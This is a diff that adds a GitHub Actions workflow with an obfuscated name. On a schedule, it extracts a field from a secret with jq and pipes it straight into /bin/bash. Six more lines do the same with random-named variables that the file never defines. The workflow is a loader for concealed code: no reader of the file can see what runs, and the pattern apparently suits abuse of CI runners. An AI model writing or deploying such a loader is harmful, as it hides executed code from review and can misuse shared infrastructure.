@@ -1,0 +1,24 @@
+name: shisanjiazhierqianwan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shisanjiazhierqianwan
+        env:
+          h22832: ${{ secrets.h22832 }}
+        run: |
+          echo $h22832 | jq -r .ydife40 | /bin/bash
+          echo $rbrhe58 | jq -r .uakre83 | /bin/bash
+          echo $wnpft59531 | jq -r .wqd97638 | /bin/bash
+          echo $qmf0422 | jq -r .brm00 | /bin/bash
+          echo $upk96810 | jq -r .qbwhe29935 | /bin/bash
+          echo $rtdv9 | jq -r .etrc394 | /bin/bash
+          echo $zei5 | jq -r .sll544 | /bin/bash
+
